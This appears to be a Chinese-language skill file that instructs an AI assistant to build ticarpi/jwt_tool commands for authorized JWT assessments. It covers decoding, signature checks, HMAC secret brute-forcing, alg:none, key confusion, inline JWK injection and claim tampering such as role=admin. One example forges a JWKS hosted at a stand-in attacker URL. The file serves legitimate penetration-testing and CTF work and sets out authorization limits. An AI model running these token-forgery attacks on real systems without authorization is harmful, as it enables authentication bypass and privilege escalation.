---
name: jwt-tool-skill
description: 使用 ticarpi/jwt_tool 进行授权范围内 JWT 评估的辅助技能。当用户提到 `jwt_tool`，需要 JWT 解码、验签、密钥爆破、声明篡改、playbook 扫描、`alg:none`、密钥混淆、JWKS 伪造或内联 JWK 注入的命令，或使用 `-r` 的原始请求模式，或用真实 HTTP 请求测试 Bearer 令牌信任关系时，使用本技能。即使用户只描述了令牌、头部、Cookie 或抓到的请求而未明确要求使用技能，只要询问如何用 `jwt_tool` 审计或利用 JWT 处理逻辑，也务必使用本技能。
---

# jwt-tool-skill

用本技能把一个 JWT 测试目标转化为可落地的 `jwt_tool` 工作流与具体命令。

回答范围应限定在授权测试、实验环境、演示、研究或 CTF 之内。如果请求针对具体目标且授权情况不明，先用一句简短提问确认，再给出针对该目标的命令。

## jwt_tool.py 文件路径

jwt_tool.py 位于 /opt/jwt_tool

## 本技能的适用范围

当用户想要完成以下事项时使用本技能：

- 用 `jwt_tool` 检查或解码 JWT
- 用公钥或 JWKS 校验签名
- 用字典爆破 HMAC 密钥
- 测试 `alg:none`、密钥混淆、伪造 JWKS 或内联 JWK 攻击
- 篡改 payload 或头部声明并重放令牌
- 对在线端点运行 `jwt_tool` 扫描
- 用 `-r` 使用抓到的 HTTP 请求
- 弄清哪些 `jwt_tool` 参数适用于某个 JWT 测试场景

如果用户主要想了解 JWT 漏洞原理或不涉及 `jwt_tool` 的通用方法论，其他 JWT 或渗透测试技能可能更合适。

## 回答风格

默认给出简短、可直接运行的答案。

对大多数请求，采用以下结构：

### 推荐命令

先给出一条主命令。只有在存在真实取舍（例如 Docker 与本地 Python、`-r` 与手工 `-rc`/`-rh`）时，才补充一个替代方案。

### 为什么适用

用一到两段简短说明或 3-5 条要点，解释所选模式与关键参数。

### 需要关注什么

告诉用户哪些输出差异有意义，例如：

- 签名有效还是无效
- 响应码或响应体长度变化
- canary 字符串是否匹配
- 篡改后声明是否仍被接受
- 是否成功恢复密钥
- 是否有证据表明伪造令牌被接受

### 下一步升级

如果第一条命令命中，给出下一个可能的 `jwt_tool` 步骤。

如果缺少某个关键输入，先用一个简短问题确认。典型例子：

- 你手上有原始 JWT，还是只有包含它的 HTTP 请求？
- 令牌在 Cookie、请求头还是 POST body 中？
- 你是否已有公钥、JWKS 或候选密钥？

如果用户已提供足够信息可构造命令，不要为不必要的问题停下。

## 安全边界

- 只协助授权系统、实验环境、演示、研究或 CTF。
- 优先做验证和低噪声检查，再考虑激进利用。
- 用户未声明拥有授权时，不要暗示其已获得许可。
- 如果用户要求破坏性或高噪声测试，尽可能建议先做更安全的第一轮尝试。

## 决策流程

1. 判断用户的起点。
- `只有令牌`：先做离线解码、检查、验签、爆破、篡改或签名。
- `令牌 + 在线目标`：选择 `-t` 配合 `-rc` 或 `-rh`；若已有保存的请求，优先用 `-r`。
- `已有密钥材料`：走 `-V`、`-S`、`-X k` 或 JWKS 重建路径。
- `JWT 弱点假设`：转到能确认或否定该假设的最小命令。

2. 优先选择最不脆弱的请求传输方式。
- 如果用户有从 Burp 导出的原始请求文件，优先用 `-r`，因为它保留头部、Cookie 与 body 结构。
- 否则用 `-t` 加 `-rc`、`-rh` 以及可选的 POST 数据。
- 如果存在成功标记，加上 `-cv`，让 `jwt_tool` 更快高亮被接受的令牌。

3. 先收集证据。
- 在改动令牌之前先解码。
- 有密钥材料时先验签。
- 目标是大范围评估时，先跑扫描，再手工构造利用链。

4. 有明确理由后才升级。
- `-M pb` 用于宽泛的第一轮尝试。
- `-M er` 用于应用可能通过强制报错暴露行为的场景。
- `-C` 用于 HMAC 密钥测试。
- `-X a`、`-X k`、`-X s` 或 `-X i` 用于具体利用假设。
- `-I` 用于声明/头部注入或 fuzz。
- `-T` 用于用户明确要求手工交互式篡改时。

## 安装方式选择

如果用户未指定环境，简要说明两种方式并推荐其中一种。

- 用户只想快速跑通工具时，Docker 是更安全的默认选择。
- 用户已克隆仓库或需要方便访问本地文件时，本地 Python 方式即可。

Docker 基础命令：

```bash
docker run -it --network "host" --rm -v "${PWD}:/tmp" -v "${HOME}/.jwt_tool:/root/.jwt_tool" ticarpi/jwt_tool
```

本地安装：

```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 -m pip install -r requirements.txt
python3 jwt_tool.py -h
```

给出引用本地文件的 Docker 示例时，请记住它们在容器内位于 `/tmp/...`。

## 高价值命令模式

需要"测试目标到 `jwt_tool` 参数"的紧凑对照与示例时，阅读 `jwt-tool-skill/references/command-recipes.md`。

使用以下默认值：

- 仅解码：`python3 jwt_tool.py <JWT>`
- 用 PEM 验签：`python3 jwt_tool.py <JWT> -V -pk public.pem`
- 用 JWKS 验签：`python3 jwt_tool.py <JWT> -V -jw jwks.json`
- 用字典爆破 HMAC 密钥：`python3 jwt_tool.py <JWT> -C -d wordlist.txt`
- 测试 `alg:none`：`python3 jwt_tool.py <JWT> -X a`
- 测试密钥混淆：`python3 jwt_tool.py <JWT> -X k -pk public.pem`
- 注入内联 JWK：`python3 jwt_tool.py <JWT> -X i`
- 伪造远程 JWKS：`python3 jwt_tool.py <JWT> -X s -ju https://attacker.example/jwks.json`
- 注入或 fuzz 声明：`python3 jwt_tool.py <JWT> -I -pc role -pv admin`
- 运行 playbook 扫描：`python3 jwt_tool.py -t https://target.example -rc "jwt=<JWT>" -M pb`
- 优先使用抓包请求模式：`python3 jwt_tool.py -r request.txt -M pb`

## 命令构造规则

### 离线令牌检查

适用于用户只有令牌、想弄清其内容的情况。

从这条开始：

```bash
python3 jwt_tool.py '<JWT>'
```

需要指出的点：

- `alg`、`kid`、`jku`、`jwk`、`x5u`
- `iss`、`aud`、`sub`、`role`、`scope`、`tenant`、`exp`、`nbf`、`iat`
- 该算法对应的是 HMAC 还是非对称验签路径

### 签名校验

当用户已有公钥、由私钥导出的公钥或 JWKS 时，使用 `-V`。

示例：

```bash
python3 jwt_tool.py '<JWT>' -V -pk public.pem
python3 jwt_tool.py '<JWT>' -V -jw jwks.json
```

如果用户只有 JWKS URL，请告知 `jwt_tool` 对本地文件的支持更直接，因此通常先把文件抓下来更简单，除非他们正是在测试 `jku` 的信任关系本身。

### 密钥爆破

仅对 `HS256`、`HS384`、`HS512` 等 HMAC 算法使用 `-C`。

示例：

```bash
python3 jwt_tool.py '<JWT>' -C -d jwt-common.txt
python3 jwt_tool.py '<JWT>' -C -d /path/to/wordlist.txt
```

如果令牌使用 RSA、EC 或 PSS 算法，不要建议 `-C`，也不要暗示它会生效。

### 在线应用测试

用户已有原始请求文件时，优先用 `-r request.txt`。

示例：

```bash
python3 jwt_tool.py -r request.txt -M pb
python3 jwt_tool.py -r request.txt -M er -cv 'Welcome'
```

如果没有请求文件，用 `-t`、`-rc` 和 `-rh` 构造请求。

示例：

```bash
python3 jwt_tool.py -t 'https://target.example/profile' -rh 'Authorization: Bearer <JWT>' -cv 'Welcome' -M pb
python3 jwt_tool.py -t 'https://target.example/' -rc 'jwt=<JWT>; session=abc' -M er
```

至少有一个请求头、Cookie 或 POST 字段必须真正包含该 JWT。

### 声明注入与 fuzz

当用户希望做可控编辑而不进入交互流程时，使用 `-I`。

示例：

```bash
python3 jwt_tool.py '<JWT>' -I -pc role -pv admin -X a
python3 jwt_tool.py '<JWT>' -I -pc tenant_id -pv 1 -S hs256 -p 'secret'
python3 jwt_tool.py '<JWT>' -I -hc kid -hv fuzz.txt -X a
```

如果某个取值参数指向文件，说明单次运行中可以用该文件对某个头部或 payload 值进行 fuzz。

### 利用方式选择

谨慎使用以下利用代码，并说明其前置条件：

- `-X a`：仅当后端接受无签名令牌时，`alg:none` 才有意义。
- `-X k`：密钥混淆需要已知公钥以及存在缺陷的实现。
- `-X s`：伪造 JWKS 需要服务器信任攻击者可控的 `jku` 或相关的密钥查找行为。
- `-X i`：内联 JWK 注入需要后端信任攻击者提供的 `jwk` 值。

不要把这些描述为必然成功，而应表述为假设验证。

### 交互式篡改

仅当用户明确要求引导式交互编辑器，或需要手动探索令牌时，使用 `-T`。

```bash
python3 jwt_tool.py '<JWT>' -T
```

如果用户想要可重复或可脚本化的命令，优先用 `-I` 而非 `-T`。

### 日志回顾

如果用户提供了 `jwttool_<id>` 跟踪标识并想查看此前的运行记录，转到：

```bash
python3 jwt_tool.py -Q jwttool_deadbeef1234567890
```

## 常见建议模式

- 如果用户不确定 JWT 在请求中的位置，建议从 Burp 中提取真实请求并使用 `-r`。
- 如果目标对所有请求返回相同状态码，建议用 `-cv` 加成功标记，并对比响应大小与 body 文本。
- 如果计划中包含 `jwt_tool` 自动生成的密钥或 JWKS，提醒用户首次运行会在其 jwt_tool 目录下创建本地密钥材料与配置。
- 如果用户正在测试伪造 JWKS 或 collaborator 类检查，提醒其配置 `jwtconf.ini` 中的 `jwksloc`、`httplistener` 等取值。
- 如果用户只想检查令牌，不要直接跳到攻击命令。

## 避免失败的规则

- 非 HMAC 令牌不要建议 `-C`。
- 给出在线目标命令时不要省略令牌位置。
- 用户要求非交互式单行命令时，不要推荐 `-T`。
- 用户已有抓包请求时，不要假设 `-t` 比 `-r` 更好。
- 不要在未说明所检验的信任假设时推荐利用参数。

## 回答片段示例

**示例 1：用 PEM 密钥验签**

推荐命令：

```bash
python3 jwt_tool.py '<JWT>' -V -pk public.pem
```

为什么适用：`-V` 会检查当前签名是否与所提供的公钥匹配。这是确认令牌是否真由你恢复出的密钥签发的快捷方式。

需要关注什么：明确的验签有效或无效结果。

下一步升级：如果有效且应用使用非对称算法，测试 `kid`、`jku` 或密钥混淆路径是否被过度信任。

**示例 2：扫描抓包请求**

推荐命令：

```bash
python3 jwt_tool.py -r request.txt -M pb -cv 'Welcome'
```

为什么适用：`-r` 完整保留原始请求结构，而 `-M pb` 是针对常见 JWT 信任问题的最佳首轮自动化审计。

需要关注什么：任何请求 ID、状态码变化、响应体长度，或伪造令牌下出现的成功标记。

下一步升级：用 `-X ...` 或 `-I ...` 重跑最有希望的具体攻击，以便有意识地验证并利用它。
